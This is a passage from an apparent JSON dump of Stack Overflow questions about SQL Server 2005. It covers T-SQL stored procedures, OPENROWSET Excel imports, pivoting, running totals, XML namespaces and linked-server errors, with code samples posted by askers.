dateadd(d,1,@periodStart)\n    set @year = year(@periodStart)\n    set @qtr = datepart(qq,@periodStart)\n    set @mth = month(@periodStart)\n    set @wkdy = case when datepart(dw,@periodStart) &gt; 5 then 'Weekend' else 'Weekday' end --Friday and Saturday.\nend\n\n--Return results\nselect\n    [Property]\n    ,[Year]\n    ,Qtr\n    ,Mth\n    ,WkDy\n    ,Nts = sum(Nts)\n    ,SaleAmt = sum(SaleAmt)\nfrom\n    @results\nwhere\n    Nts != 0\ngroup by\n    [Property]\n    ,[Year]\n    ,Qtr\n    ,Mth\n    ,WkDy\n\ndrop table t\n</code></pre>\n\n<p>Results:</p>\n\n<pre><code>Property    Year    Qtr Mth WkDy    Nts SaleAmt\nA   2012    1   1   Weekday 12  150.48\nA   2012    1   1   Weekend 4   50.16\nA   2012    1   2   Weekday 21  263.34\nA   2012    1   2   Weekend 8   100.32\nA   2012    1   3   Weekday 21  263.34\nA   2012    1   3   Weekend 10  125.4\nA   2012    2   4   Weekday 22  275.88\nA   2012    2   4   Weekend 8   100.32\nA   2012    2   5   Weekday 23  288.42\nA   2012    2   5   Weekend 8   100.32\nA   2012    2   6   Weekday 20  250.8\nA   2012    2   6   Weekend 10  125.4\nA   2012    3   7   Weekday 23  288.42\nA   2012    3   7   Weekend 8   100.32\nA   2012    3   8   Weekday 22  275.88\nA   2012    3   8   Weekend 9   112.86\nA   2012    3   9   Weekday 21  263.34\nA   2012    3   9   Weekend 9   112.86\nA   2012    4   10  Weekday 23  288.42\nA   2012    4   10  Weekend 8   100.32\nA   2012    4   11  Weekday 21  263.34\nA   2012    4   11  Weekend 9   112.86\nA   2012    4   12  Weekday 22  275.88\nA   2012    4   12  Weekend 9   112.86\nB   2012    4   11  Weekday 21  228.06\nB   2012    4   11  Weekend 9   97.74\nB   2012    4   12  Weekday 22  238.92\nB   2012    4   12  Weekend 9   97.74\nC   2012    4   12  Weekday 1   2869\nD   2012    4   12  Weekday 22  2128.94\nD   2012    4   12  Weekend 9   870.93\n</code></pre>\n\n<p>Code for accrued nights and accrued revenue functions:</p>\n\n<pre><code>create function dbo.accruedNights( @arrival datetime, @departure datetime, @bospan datetime, @eospan datetime ) \n  returns int\nbegin\n declare @nights int\n\n set @nights = datediff(day, case when @arrival&gt; @bospan then @arrival else @bospan end, case when @departure&lt; @eospan then @departure else @eospan end)\n return case when @nights &gt; 0 then @nights else 0 end\nend\n\ncreate function dbo.accruedRevenue( @arrival datetime, @departure datetime, @bospan datetime, @eospan datetime, @amt money, @nbrNights int ) \n  returns numeric(15,2)\nbegin\n return case @nbrNights \n          when 0 then 0 \n          else @amt / @nbrNights * dbo.accruedNights( @arrival,@departure,@bospan,@eospan ) end\nend\n    end\n</code></pre>\n"},{"tags":["sql-server-2005","openrowset"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":228,"score":0,"question_id":11683338,"title":"pass dynamic file path of excel to \"OPENROWSET\"","body":"<p>I want pass dynamic URL of excel to \"OPENROWSET\".</p>\n\n<p>NOTE - I am passing returned result of excel file to cursor.\nI want to pass file path to \"@excelpath\",\nI have tried many ways but its giving syntax error. </p>\n\n<pre><code> ALTER procedure [dbo].[import_excel]\n(\n    @excelpath as nvarchar(max)\n)\nas      \nbegin\n  set nocount on \n  DECLARE insert_cursor CURSOR FOR \n  select * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', \n    'Excel 12.0;Database=C:\\memberdata.xlsx', [Sheet1$])\n  OPEN insert_cursor;\n  FETCH NEXT FROM insert_cursor\n      INTO @id_number, @memberName\n\n  WHILE @@FETCH_STATUS = 0\n  BEGIN\n  -- body of cursor\n      FETCH NEXT FROM insert_cursor\n      INTO @id_number, @memberName\n  END\n  CLOSE insert_cursor;\n  DEALLOCATE insert_cursor;\nEND\n</code></pre>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","select"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":11687016,"title":"How to select dynamic column value from a table?","body":"<p>I have a table called \"TableA\" which has the following records:</p>\n\n<p>TableA:</p>\n\n<pre><code>      ID       Jan       Feb\n     ----     -----     -------\n      1      '01/12'    '04/12'\n</code></pre>\n\n<p>Here I want to select any one of the column value from the table. But the column name is assigned to a variable. We don't know the exact column name.</p>\n\n<p>For Example:</p>\n\n<pre><code>    Declare @Month VARCHAR(20)\n    SET @Month = 'Feb'\n\n    Select @Month from TableA\n</code></pre>\n\n<p>It gives the Output as follows:</p>\n\n<pre><code>    'Feb'\n</code></pre>\n\n<p>But the Desired Output is '04/12'</p>\n\n<p>How to get the desired output?</p>\n"},{"tags":["sql-server-2005","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":370,"score":3,"question_id":5008560,"title":"Putting stuff into date ranges in SQL Server 2005","body":"<p>I have a table with week ranges (week number,start date, end date) and a table with tutorial dates (for writing tutors (tutor ID, tutorial_date, tutorial type(A or B).</p>\n\n<p>I want to create two query that shows the week ranges (week 1, week 2) across the top with the tutor names on the side with count of tutorials (of type \"A\") in that week's date range in each block for that week.</p>\n\n<p>The result should look like this:</p>\n\n<p>Counts of Tutorials of Type \"A\"</p>\n\n<pre><code>Tutor|Week One|Week Two|Week Three|Week Four|Total\nJoe  |   3    |   5    |    7     |    8    | 23        \nSam  |   2    |   4    |    3     |    8    | 17        \n</code></pre>\n\n<p>Meaning that Joe completed 3 tutorials in week one, five in week two, 7 in week three, and 8 in week 4.</p>\n\n<p>The second query should show totals for tutorial type \"A\" and type \"B\"</p>\n\n<pre><code>Tutor|Week One|Week Two|Week Three|Week Four|Total   |\nJoe  |  3/1   |   5/3  |   7/2    |   8/2   | 23/8   |     \nSam  |  2/3   |   4/4  |   3/2    |   8/3   | 17/12  |      \n</code></pre>\n\n<p>Here, in Week One, Joe has done 3 tutorials of type A and 1 of type B.</p>\n\n<p>Sample table data for tutorials (week one)</p>\n\n<pre><code>Tutor | Tutorial_ID | Tutorial Date |Type|\n------------------------------------------\nJoe   |    1        | 2011-01-01    | A  |\nJoe   |    2        | 2011-01-02    | A  |\nJoe   |    3        | 2011-01-03    | A  |\nJoe   |    4        | 2011-01-03    | B  |\nSam   |    5        | 2011-01-01    | A  |\nSam   |    6        | 2011-01-02    | A  |\nSam   |    7        | 2011-01-03    | B  |\n</code></pre>\n\n<p>The week table looks like this:</p>\n\n<pre><code>weekNumber |startDate |endDate\n1          |2011-01-01|2011-01-15\n</code></pre>\n\n<p>I'd like to gen this in SQL Server 2005</p>\n"},{"tags":["asp.net","sql-server-2005","nhibernate","activerecord","deadlock"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":11681886,"title":"nhibernate deadlock","body":"<p>I have a basic asp.net aspx page performing a simple NHibernate Get/Delete/Update procedure on a 'button click' event.</p>\n\n<p>I find that whenever I perform the same request/query multiple times (around 10+ times consecutively), the SQL server respond with \"<b>Lock request time out period exceeded</b>\"</p>\n\n<p>When the error occurs, I cannot perform any queries on the same database table (PathAcess). Until I reset the web application.</p>\n\n<p>Upon checking the SQL Server with 'sp_who2', I can see that my web application has caused a deadlock and all future queries on the same table could not be executed.</p>\n\n<p>However, if I place a '<em>using(new SessionScope()){}</em>' around the Nhibernate code in the asp.net page, the error seems to go away (but I am not completely sure)</p>\n\n<p>Does anyone know why this error happens and if the solution I used a good long term solution?</p>\n\n<p>Thanks!</p>\n\n<p>Below is the code snippet in the page</p>\n\n<pre><code>  List&lt;PathAccess&gt; accessList =\n                (from access in PathAccess.Queryable\n                 where access.ObjectId == _object.ID &amp;&amp; access.SiteId == _site_id\n                 select access).ToList();\n            List&lt;ObjectAccess&gt; navAccessList =\n                (from access in ObjectAccess.Queryable where access.ObjectId == _object.ID select access)\n                    .ToList();\n            if (accessList.Count &gt; 0)\n            {\n                foreach (PathAccess access in accessList)\n                {\n                    if (!navAccessList.Select(itm =&gt; itm.ClubId).Contains(access.ClubId))\n                    {\n                        access.DeleteAndFlush();\n                    }\n                    else\n                    {\n                        // update access.Path\n                        access.Path = _object.ObjectUrl;\n                        access.ObjectId = _object.ID;\n                        access.DateCreated = DateTime.Now;\n                        access.PathType = 2;\n                        access.UpdateAndFlush();\n                    }\n                }\n            }\n            else\n            {\n                foreach (ObjectAccess access in navAccessList)\n                {\n                    PathAccess path = new PathAccess();\n                    path.Path = _object.ObjectUrl;\n                    path.ObjectId = _object.ID;\n                    path.SiteId = _site_id;\n                    path.ClubId = access.ClubId;\n                    path.DateCreated = DateTime.Now;\n                    path.PathType = 2;\n                    path.SaveAndFlush();\n                }\n            }\n\n  In Global.asax - Application_BeginRequest              \n  this.Context.Items[\"SessionScope\"] = new SessionScope();\n\n  In Global.asax - Application_EndRequest\n  try\n            {\n                var sessionScope = this.Context.Items[\"SessionScope\"] as SessionScope;\n                if (sessionScope != null)\n                {\n                    sessionScope.Dispose();\n                }\n            }\n            catch\n            {\n            }\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":162,"score":-1,"question_id":11679707,"title":"Data Archiving & Purging In SQL Server 2008 R2","body":"<p>I want to archive old data in SQL Server 2008 R2. </p>\n\n<p>Let me explain this situation. 1st I was take full backup of the database and the backup date was 21 Oct, 2011. After that I purge data up to 30 jun, 2011. so that in this database data have from 1 July, 2011 to today. </p>\n\n<p>Now we want to archiving data, for this reason we restore 21 Oct, 2011 backup into another server called archive server. Now I want add/update data into archive server which are change or not exists into archive server from production server. </p>\n\n<p>What should I do? Please give me some suggestion. I do a lot of googling but didn't find any idea.</p>\n\n<p>thank you.       </p>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":11680287,"title":"Stored Procedure take either or variables?","body":"<p>I'm working in sql server 2005 here and I wanted to know if there was a way to make a stored procedure take variable a or variable b for its parameters.</p>\n\n<p>Right now if I declare A and B it requires both A and B.  Possible to make it take A or B instead?  So that if the other one doesn't have a value it uses the other?</p>\n\n<p>ex:</p>\n\n<pre><code>@ID VARCHAR(255)\n@MAKE VARCHAR(255)  \nAS  \nBEGIN  \n    SET NOCOUNT ON  \n    SELECT *  \n    FROM CARS   \n    WHERE ID = @ID OR MAKE =@MAKE\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","sql-agent-job"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":11675829,"title":"SQL server job not listed under SQL Server Management studio jobs list","body":"<p>I have generated a script for the SQL Server Agent job that I created.</p>\n\n<p>However, when I run the script even though the job is created successfully (able to verify it through sysjobs_view system view) but it does not get listed under SQL Server Agent jobs list.</p>\n\n<p>Does anyone know what the issue could be?</p>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","join","query-optimization","subquery"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":11653096,"title":"Remove a subquery","body":"<p>I have this query</p>\n\n<pre><code>select \n    T1.local,\n    m.Nombre as Marca, \n    T1.NombreLinea as Linea , \n    case  when T1.IdComprobanteTipo in (21,23,26,28) then 0 else -sum(T1.Cantidad) end as Cantidad,\n    case  when T1.IdComprobanteTipo in (21,23,26,28) \n    --toma en cuenta los descuentos de las facturas que fueron anuladas\n    then T1.TotalNeto \n    else isnull(T1.ImporteNeto,0) - isnull((select sum(importe) as importe \n                                            from GrimPosCon..Fact_Descuento (nolock) DD\n                                            where DD.IdComprobante = T1.idComprobante  and T1.IdDim_Producto = IdDim_Producto\n                                             and T1.IdDim_Medida = IdDim_Medida and T1.IdDim_Calidad = IdDim_Calidad \n                                             and exists \n                                                (\n                                                select 1 \n                                                    from GrimPosCon..ComprobanteReferencias (nolock) AA\n                                                    inner join GrimPosCon..Fact_Comprobante (nolock) BB on aa.IdComprobanteCredito = BB.IdComprobante\n                                                    where AA.IdComprobanteDebito = DD.IdComprobante\n                                                    and BB.IdDim_ComprobanteTipo in (4,13,16,19)\n                                                )\n                                            ),0) end as IMPORTE, \n    T1.NombreFamilia as Familia\nfrom \n#Query T1\ninner join GrimPosCon..Dim_Marca(nolock) m on m.IdDim_Marca = T1.IDDim_Marca\nGroup by  \n    T1.local, m.Nombre,T1.NombreLinea,T1.NombreFamilia,T1.TotalNeto,T1.IdComprobante, T1.IdDim_producto,\n    T1.idDim_Medida,T1.ImporteNeto,T1.IdComprobanteTipo,T1.IdDim_Calidad\n</code></pre>\n\n<p>I want to remove the biggest subquery.\nI tried to do <code>Left Joins where is not null</code>, but it gave me a different result.\nHow Can I modify that ?\nI want the same result, but use some Joins, or something more faster than that subquery. According to the execution plan, that subquery takes the %35 of the total query, and takes almost 50 secs in running all query</p>\n"},{"tags":["xml","sql-server-2005","xquery","xml-namespaces"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":11674332,"title":"SQL Server 2005 XML with Namespaces","body":"<p>Sorry for the kind of n00b question, but this is my first time dealing with XML in SQL Server (2005).  Here is what I thought would work...</p>\n\n<pre><code>DECLARE @doc xml\n\nSET @doc =\n\n'&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;p:OrderRequest xmlns:p=\"http://xxx.OrderRequest/2\" xmlns:xsi=\"http://xxx.XMLSchema-instance\" xsi:schemaLocation=\"http://xxx.OrderRequestV2.xsd \"&gt;\n  &lt;p:Header&gt;\n    &lt;p:LLLRequestCount&gt;0&lt;/p:LLLRequestCount&gt;\n    &lt;p:MFRRequestCount&gt;1&lt;/p:MFRRequestCount&gt;\n    &lt;p:FileCreatedAt&gt;2001-12-31T12:00:00&lt;/p:FileCreatedAt&gt;\n    &lt;p:RequestFileName&gt;p:RequestFileName&lt;/p:RequestFileName&gt;\n  &lt;/p:Header&gt;\n  &lt;p:RequestItems&gt;\n  &lt;p:MFRRequest id=\"1\" priority=\"\"&gt;\n      &lt;p:AccountNumber&gt;9999999&lt;/p:AccountNumber&gt;\n      &lt;Status&gt;Initial&lt;/Status&gt;\n      &lt;p:CaseInformation&gt;\n       &lt;ReferralDate&gt;2011-01-01&lt;/ReferralDate&gt;\n       &lt;Type&gt;1A&lt;/Type&gt;\n       &lt;ARM&gt;Yes&lt;/ARM&gt;\n        &lt;InvestorNumber&gt;InvestorNumber&lt;/InvestorNumber&gt;\n        &lt;PropertyAddress&gt;PropertyAddress&lt;/PropertyAddress&gt;\n        &lt;PrivateLabel&gt;Yes&lt;/PrivateLabel&gt;\n        &lt;CaseNumber&gt;01-11111/AK/&lt;/CaseNumber&gt;\n        &lt;SuspenseBalance&gt;9999.00&lt;/SuspenseBalance&gt;\n        &lt;TitleOrderedDate&gt;2011-09-01&lt;/TitleOrderedDate&gt;\n        &lt;TotalMonthlyPayment&gt;876.99&lt;/TotalMonthlyPayment&gt;\n      &lt;/p:CaseInformation&gt;\n    &lt;/p:MFRRequest&gt;\n  &lt;/p:RequestItems&gt;\n&lt;/p:OrderRequest&gt;'\n;WITH XMLNAMESPACES(DEFAULT 'http://xxx.OrderRequest/2)')\n\n\nSELECT Y.i.value('Status[1]', 'varchar(10)') AS Status\nFROM @doc.nodes('/OrderRequest/MFRRequest') AS Y(i)\n</code></pre>\n\n<p>... but I get back blank.  I have tried using OPENXML as well.  I only ever get blanks.  I've tried so many examples at this point and I am not sure what I'm missing :-/</p>\n\n<p>I need to pull back the ID property of MFRRequest, AccountNumber, Status, and then several of the fields in CaseInformation.  I would be very grateful for any assistance.  Thanks so much!</p>\n"},{"tags":["c#","sql-server","sql-server-2005","stored-procedures"],"answer_count":10,"favorite_count":6,"up_vote_count":6,"down_vote_count":0,"view_count":8145,"score":6,"question_id":169330,"title":"Simple way to programmatically get all stored procedures","body":"<p>Is there a way to get stored procedures from a SQL 2005 Express database using C#?  I would like to export all of this data in the same manner that you can script it our using SQL Management Studio, without having to install the GUI.</p>\n\n<p>I've seen some references to do thing via the PowerShell but in the end a C# console app is what I really want.</p>\n\n<p><strong><em>To clarify....</em></strong>\nI'd like to script out the stored procedures.  The list via the Select * from sys.procedures is helpful, but in the end I need to script out each of these.</p>\n"},{"tags":["sql-server-2005","openrowset","msdasql"],"answer_count":3,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":14219,"score":4,"question_id":1362108,"title":"Cannot initialize the data source object of OLE DB provider \"MSDASQL\" for linked server \"(null)\"","body":"<p>Having an interesting issue. I'm reading from an excel file on a server via an OpenRowset in Sql2005. I've run the query a number of times without any problems. I've just gone out for a quick meeting and suddenly I get the error \"Cannot initialize the data source object of OLE DB provider \"MSDASQL\" for linked server \"(null)\"\"</p>\n\n<p>I've made sure the files are not in use on the server and even deleted them and recopied them over onto the server and still I'm getting the same error.</p>\n\n<p>UPDATE: This only seems to happen if I join two selects from different openrowsets. If I run the queries individually they still work fine. I have done the join before without any issues. Ideas?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":13,"favorite_count":8,"up_vote_count":41,"down_vote_count":0,"view_count":49610,"score":41,"question_id":314998,"title":"SQL Server 2005 drop column with constraints","body":"<p>I have a column with a \"DEFAULT\" constraint. I'd like to create a script that drops that column.</p>\n\n<p>The problem is that it returns this error:</p>\n\n<pre><code>Msg 5074, Level 16, State 1, Line 1  \nThe object 'DF__PeriodSce__IsClo__4BCC3ABA' is dependent on column 'IsClosed'. \nMsg 4922, Level 16, State 9, Line 1 \nALTER TABLE DROP COLUMN IsClosed failed because one or more objects access this column.\n</code></pre>\n\n<p>I couldn't find an easy way to drop a column and all its associated constraints (only found big scripts that look into the system table... there MUST (!!) be a \"nice\" way to do it.)</p>\n\n<p>And as the DEFAULT constraint's name has been randomly generated, I can't drop it by name.</p>\n\n<hr>\n\n<p><strong>Update</strong> :<br>\nThe constraint type is \"DEFAULT\".</p>\n\n<p>I saw the solutions that you all proposed but I find them all really \"dirty\"... Don't you think?\nI don't know if it's with Oracle or MySQL but it's possible to do something like:</p>\n\n<pre><code>DROP COLUMN xxx CASCADE CONSTRAINTS \n</code></pre>\n\n<p>And it drops all related constraints... \nOr at least it automatically drops the constraints mapped to that column (at least CHECK constraints!)</p>\n\n<p>Is there nothing like that in MSSQL?</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures","select-statement"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":11665789,"title":"Not getting any results from stored procedure","body":"<p>I have the following procedure interface:</p>\n\n<pre><code>create procedure [dbo].[GetsItemDetails]\n(\n    @SiteURL varchar\n)\nAS\n\nselect \n    *\nfrom\n    s_ItemDetails\nwhere\n    SiteURL = @SiteURL\n</code></pre>\n\n<p>When I call it this way:</p>\n\n<pre><code>DECLARE @return_value int\n\nEXEC    @return_value = [dbo].[GetsItemDetails]         @SiteURL =\nN'fgh'\n\nSELECT  'Return Value' = @return_value\n</code></pre>\n\n<p>I get nothing when there is a record with siteURL \"fgh\"</p>\n"},{"tags":["sql","sql-server","sql-server-2005","select","user-defined-functions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":594,"score":0,"question_id":11669322,"title":"SQL User defined function, can't find dbo or user-defined function","body":"<p>I have created a function in my database using this query:</p>\n\n<pre><code>CREATE FUNCTION dbo.fnSplit(\n    @sInputList VARCHAR(MAX) -- List of delimited items\n  , @sDelimiter VARCHAR(MAX) = ',' -- delimiter that separates items\n) RETURNS @List TABLE (item VARCHAR(MAX))\n\nBEGIN\nDECLARE @sItem VARCHAR(MAX)\nWHILE CHARINDEX(@sDelimiter,@sInputList,0) &lt;&gt; 0\n BEGIN\n SELECT\n  @sItem=RTRIM(LTRIM(SUBSTRING(@sInputList,1,CHARINDEX(@sDelimiter,@sInputList,0)-1))),\n  @sInputList=RTRIM(LTRIM(SUBSTRING(@sInputList,CHARINDEX(@sDelimiter,@sInputList,0)+LEN(@sDelimiter),LEN(@sInputList))))\n\n IF LEN(@sItem) &gt; 0\n  INSERT INTO @List SELECT @sItem\n END\n\nIF LEN(@sInputList) &gt; 0\n INSERT INTO @List SELECT @sInputList -- Put the last item in\nRETURN\nEND\nGO\n</code></pre>\n\n<p>And SQL Server returned : <code>Command(s) completed successfully.</code></p>\n\n<p>Then I tried to run this query:</p>\n\n<pre><code>SELECT * FROM maj_Posts a\nWHERE FeedID = (SELECT dbo.fnSplit(b.FeedIDs) FROM maj_Magazines b WHERE OwnerID = 1)\nORDER BY countOfComments DESC \n</code></pre>\n\n<p>It returned an error: <code>Msg 4121, Level 16, State 1, Line 1\nCannot find either column \"dbo\" or the user-defined function or aggregate \"dbo.fnSplit\", or the name is ambiguous.</code></p>\n\n<p><strong>Note that <code>b.FeedIDs</code> is an string contains comma-separated numbers, like this : <code>1,2,4</code></strong></p>\n\n<p><strong>And I want to get rows from <code>maj_Posts</code> which their <code>a.FeedID</code> is one of the numbers in <code>b.FeedIDs</code>...</strong> (For example, if <code>b.FeedIDs</code> is <code>1,2,4</code>, I need rows from <code>maj_Posts</code> that their <code>FeedID</code> is 1 or 2 or 4.)</p>\n\n<p>What is the problem?</p>\n"},{"tags":["performance","sql-server-2005","datetime","comparison"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":183,"score":0,"question_id":9700138,"title":"Sql server Datetime comparison is taking time to execute","body":"<p>I have a query in SQL Server2005, where 2 date fields are compared. If I dont include time and use only date part for comparison then the query runs fast(in milliseconds). However, I need to compare the time also along with Date part. If I include time part the query runs very slow and finally its returning connection time out error.</p>\n\n<pre><code> `((startdate1 &gt;= @startdate2 and enddate1 &lt;= @enddate2) or\n(startdate1 &lt;= @startdate2 and enddate1 &gt;= @startdate2 and enddate1 &lt;= @enddate2 ) or\n(startdate1 &gt;= @startdate2 and startdate1 &lt; @enddate2 and enddate1 &gt; @enddate2) or\n(startdate1 &lt; @startdate2 and enddate1 &gt; @enddate2))`\n</code></pre>\n\n<p>This part of the query is taking a lot of time to execute. However, If I change the query to below format, query runs very fast.</p>\n\n<pre><code>    ((cast(CONVERT(VARCHAR(10),startdate1,101) as datetime) &gt;= cast(CONVERT(VARCHAR(10),@startdate2,101) as datetime)      \nAND cast(CONVERT(VARCHAR(10),enddate1,101) as datetime)&lt;=  cast(CONVERT(VARCHAR(10),@enddate2,101) as datetime) ) OR     \n\n(cast(CONVERT(VARCHAR(10),startdate1,101) as datetime) &lt;=  cast(CONVERT(VARCHAR(10),@startdate2,101) as datetime)      \nAND ((cast(CONVERT(VARCHAR(10),enddate1,101) as datetime) &gt;= cast(CONVERT(VARCHAR(10),@startdate2,101) as datetime) )     \nAND (cast(CONVERT(VARCHAR(10),enddate1,101) as datetime) &lt;=  cast(CONVERT(VARCHAR(10),@enddate2,101) as datetime)  ))) OR \n\n(cast(CONVERT(VARCHAR(10),startdate1,101) as datetime) &gt;=  cast(CONVERT(VARCHAR(10),@startdate2,101) as datetime)  and     \n((cast(CONVERT(VARCHAR(10),startdate1,101) as datetime) &lt; cast(CONVERT(VARCHAR(10),@enddate2,101) as datetime) ) AND     \n(cast(CONVERT(VARCHAR(10),enddate1,101) as datetime) &gt;  cast(CONVERT(VARCHAR(10),@enddate2,101) as datetime)  ))) OR     \n\n(cast(CONVERT(VARCHAR(10),startdate1,101) as datetime) &lt;  cast(CONVERT(VARCHAR(10),@startdate2,101) as datetime)  and     \ncast(CONVERT(VARCHAR(10),enddate1,101) as datetime) &gt;  cast(CONVERT(VARCHAR(10),@enddate2,101) as datetime) ))\n</code></pre>\n\n<p>Please suggest me some idea on this. Thanks in Advance...</p>\n"},{"tags":["c#","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":11666178,"title":"Can we delete a Data table row while reading it with SqlReader","body":"<p>I Created two Stored Procedure one for reading Datarows and One for deleting, but I was wondering If I can delete records while reading them and also if its best practice ?</p>\n\n<p>e.g.</p>\n\n<pre><code>while (rdr.Read())\n{\n    If(rdr[abc].ToString() != Null)\n    {Maybe delete it ?}\n}\n</code></pre>\n\n<p><strong>My question is, Can I delete a row while reading it ? :)</strong></p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":11665720,"title":"SQL Server Ordering Based on two columns - parent and child","body":"<p>I have an ordering problem in SQL Server.</p>\n\n<p>My result set is that of a primary column and a secondary column. The secondary column refers to child nodes of the primary column e.g. it is the id of a primary column that appears later on in the result set</p>\n\n<pre><code>Primary Column | Secondary Column\n1                  NULL\n1                  2\n1                  3\n3                  NULL\n3                  NULL\n2                  NULL\n2                  NULL\n2                  7\n</code></pre>\n\n<p>I need the SQL SELECT to be order by primary column but where there is a secondary column inject the rows related to that id under the primary column e.g. the above result set would look like. </p>\n\n<pre><code>Primary Column | Secondary Column\n1                  NULL\n1                  2\n2                  NULL\n2                  NULL\n2                  7\n1                  3\n3                  NULL\n3                  NULL\n</code></pre>\n\n<p>Is this possible in SQL without using a CURSOR</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":247,"score":0,"question_id":11664142,"title":"Cumulative Total in MS Sql server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/860966/calculate-a-running-total-in-sqlserver\">Calculate a Running Total in SqlServer</a>  </p>\n</blockquote>\n\n\n\n<p>I need to get the cumulative (running) total of a column in ms-sql server. I.e. if there is a column named Marks, then corresponding to each row cumulative sum will the sum of current and previous rows. Can we attain the result without using joins? Because my query is pretty big.</p>\n\n<p>I have included a sample table and data:</p>\n\n<pre><code>CREATE TABLE \"SCORE_CHART\" \n   (    \n        \"STUDENT_NAME\" NVARCHAR(20), \n        \"MARKS\" INT\n   )\n\nINSERT INTO SCORE_CHART (STUDENT_NAME, MARKS) VALUES ('STUD1', 95);\nINSERT INTO SCORE_CHART (STUDENT_NAME, MARKS) VALUES ('STUD2', 90);\nINSERT INTO SCORE_CHART (STUDENT_NAME, MARKS) VALUES ('STUD3', 98);\n\nSELECT STUDENT_NAME, MARKS FROM SCORE_CHART;\n</code></pre>\n\n<p>Expected result:\n<img src=\"http://i.stack.imgur.com/4LWdC.jpg\" alt=\"enter image description here\"></p>\n\n<p>In oracle its easy to write like:</p>\n\n<pre><code>SELECT \n  STUDENT_NAME,\n  MARKS,\n  SUM(MARKS) OVER (ORDER BY STUDENT_NAME) CUM_SUM\nFROM SCORE_CHART\nORDER BY STUDENT_NAME;\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":16103,"score":7,"question_id":3201432,"title":"How to get time part from Sql Server 2005 datetime in HH:mm tt format","body":"<p>How to get time part from Sql Server 2005 datetime in HH:mm tt format </p>\n\n<p><strong>e.g. 11:25 AM</strong></p>\n\n<p><strong>14:36 PM</strong></p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":78,"score":2,"question_id":11663933,"title":"Is this a syntax error?","body":"<pre><code>IF( @ActiveStatus = 1 )\nBEGIN \n    @PasswordStatus = 3 \nEND\nELSE \n    SET @PasswordStatus = (SELECT password_status \n                             FROM tbl_user\n                            WHERE login_name = @LoginName_fromApp\n                              AND password=@Pass\n                           )\n</code></pre>\n\n<p>I am using Microsoft SQL Server Management Studio.. </p>\n"},{"tags":["sql-server-2005","linked-server","openrowset","sqlncli"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":11645724,"title":"Failing to delete record from linked server","body":"<p>I've spent the past two days searching everywhere for a solution to my problem but without any luck.</p>\n\n<p>I have this query that deletes record from a remote server:</p>\n\n<pre><code>delete from OPENROWSET('SQLNCLI', 'Server=AB01S\\SQLEXPRESS;Database=ShopData;Trusted_Connection=yes', 'Select receipt_n,action_in, action_ty, action_field_name,action_field_type,action_field_data, terminal from tblData where receipt_n= 1 and terminal = 1');\n</code></pre>\n\n<p>and I am getting this error:</p>\n\n<pre><code>OLE DB provider \"SQLNCLI\" for linked server \"(null)\" returned message \"Multiple-step OLE DB operation generated errors. Check each OLE DB status value, if available. No work was done.\".\nMsg 7202, Level 11, State 1\n</code></pre>\n\n<p>It also suggests to use <code>sp_addlinkedserver</code> to add a linked server.</p>\n\n<p>Some notes:</p>\n\n<ol>\n<li>This happens only on this specific computer + remote server. On 2 different stations (Computer+Server) it worked just fine.</li>\n<li>Insert to OpenRowSet is working OK.</li>\n<li>Select * from OpenRowSet is working OK.\n     => Changing the delete to select * works OK.</li>\n<li>Ad hok is enabled on the computer that queries</li>\n<li>Remote connection is enabled on the computer being queried via openrowset</li>\n<li>I can ping the server (AB01S)</li>\n</ol>\n\n<p>So far I have tried adding linked setup via GUI and <code>sp_addlinkserver</code>.</p>\n"},{"tags":["sql-server-2005","r","ssms","rodbc","odbc-sql-server-driver"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":489,"score":0,"question_id":6228519,"title":"MSSQL login authentication problems with ODBC connection and R stats package","body":"<p>I am trying to connect an ODBC source to the R statistical package but having log in problems.</p>\n\n<p>I have set up the ODBC name <code>eplR</code> with an SQL server driver linking to the (local) server using windows NT authentication with the network login ID default. In the set up the data-source test is 